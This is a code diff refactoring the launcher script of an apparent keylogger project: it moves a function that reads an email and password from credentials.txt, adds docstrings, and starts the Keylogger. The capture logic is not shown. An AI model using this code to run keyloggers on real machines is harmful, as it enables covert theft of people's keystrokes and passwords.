@@ -2,10 +2,25 @@ from key_logger import Keylogger
 import argparse
 import signal
 
-'''
-Parser of command line arguments
-'''
+def credentials():
+    '''
+    Evaluation of credentials
+    '''
+
+    with open('credentials.txt', "r") as f:
+        credentials = ((f.read()).split('\n'))[0].split(' ')
+
+    mail = credentials[0]
+    password = credentials[1]
+
+    return mail, password
+
+
 def args_parser():
+    '''
+    Parser of command line arguments
+    '''
+
     #Parser of command line arguments
     parser = argparse.ArgumentParser()
     
@@ -19,23 +34,6 @@ def args_parser():
 
     return args.refresh_time
 
-
-'''
-Evaluation of credentials
-'''
-def credentials():
-    with open('credentials.txt', "r") as f:
-        credentials = ((f.read()).split('\n'))[0].split(' ')
-
-    mail = credentials[0]
-    password = credentials[1]
-
-    return mail, password
-
-
-'''
-Main function
-'''
 def main():
     #Parser of command line arguments
     refresh_time = args_parser()
@@ -51,7 +49,6 @@ def main():
 
     #Run the keylogger
     key_logger.start()
-
 
 if __name__=='__main__':
     main()
